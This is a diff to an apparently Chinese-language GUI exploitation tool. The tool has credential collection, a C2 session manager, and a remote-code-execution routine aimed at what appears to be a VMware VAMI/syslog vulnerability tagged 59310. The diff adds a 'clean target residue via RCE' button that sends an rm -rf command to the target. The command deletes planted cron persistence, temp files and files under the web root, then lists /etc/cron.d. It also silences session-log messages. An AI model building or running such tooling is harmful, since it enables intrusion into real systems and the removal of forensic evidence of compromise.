@@ -94,7 +94,6 @@ class ToolApp:
         self.creds = {}              # 凭据收集
         self.stop_flag = threading.Event()
         self.c2m = SessionManager(log=self.log)
-        self.c2m.on_new_session = self._on_new_session
         self.cur_sess = None
         self._build_style()
         self._build_ui()
@@ -1308,8 +1307,8 @@ class ToolApp:
         self.run_bg(work, "监听")
 
     def _on_new_session(self, sess):
-        self.root.after(0, lambda: self.log(
-            "[+] 新会话 #%d ← %s（双击会话行开始交互）" % (sess.id, sess.addr), "+"))
+        # 会话入表由 _poll_sessions 刷新，日志由 SessionManager 统一记录
+        return
 
     def _poll_term(self):
         """实时流：当前会话的原始输出直接上屏（ANSI 颜色码已剥离）。"""
@@ -1530,6 +1529,8 @@ class ToolApp:
                    command=self._clean_gen).pack(side="left")
         ttk.Button(top, text="复制到剪贴板",
                    command=self._clean_copy).pack(side="left", padx=6)
+        ttk.Button(top, text="一键清除目标残留（经 RCE）",
+                   command=self._clean_remote).pack(side="left", padx=6)
         ttk.Label(top, text="每个利用动作发生时自动登记到此页", style="Muted.TLabel").pack(
             side="left", padx=10)
 
@@ -1552,6 +1553,42 @@ class ToolApp:
         self.clean_txt.insert("1.0", "（尚无清理方案）\n"
                                      "点击上方「生成清理方案」后，此处显示本次会话的清理步骤清单。\n"
                                      "写入验证 / RCE / WebShell / 账户操作等动作发生时会自动登记。")
+
+    def _clean_remote(self):
+        """经 59310 RCE 直接清除目标上本工具的全部残留（含历史常驻 cron）。"""
+        host = (self.cur_target.get().strip() or
+                self.v59310_host.get().strip()).split(":")[0]
+        if not host:
+            messagebox.showwarning("提示", "请先在 ① 页设定目标")
+            return
+        try:
+            vport = int(self.v510_vport.get() or 5480)
+        except ValueError:
+            messagebox.showwarning("提示", "VAMI 端口需为数字")
+            return
+        port = int(self.v510_port.get() or 514)
+        tcp = self.v510_proto.get() in ("TCP", "TLS")
+        tls = self.v510_proto.get() == "TLS"
+        proxy = self.http_proxy.get().strip() or None
+        cmd = ("rm -rf /etc/cron.d/cve59310* /tmp/cve59310_* /tmp/cve59310_check_* "
+               "/tmp/ws*-syslog.log /opt/vmware/share/htdocs/r*.txt 2>/dev/null; "
+               "echo '--- /etc/cron.d/ after cleanup ---'; ls -la /etc/cron.d/ | head -20")
+        tag = rand_name(6)
+        self.stop_flag.clear()
+
+        def work():
+            self.log("[*] 一键清除目标残留 → %s : %s" % (host, cmd), "i")
+            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
+                                    vami_port=vport, proxy=proxy,
+                                    poll_cb=lambda s: self.log(s, "m"),
+                                    stop_flag=self.stop_flag)
+            if ok:
+                self.log("[+] 目标残留已清除，/etc/cron.d/ 现状:\n%s" % text, "+")
+                self.record("清理-目标残留", host, "rm -rf /etc/cron.d/cve59310* 等",
+                            "（本次操作即清理本身）")
+            else:
+                self.log("[!] %s" % text, "!")
+        self.run_bg(work, "清除残留")
 
     def _clean_gen(self):
         if hasattr(self, "act_tree"):
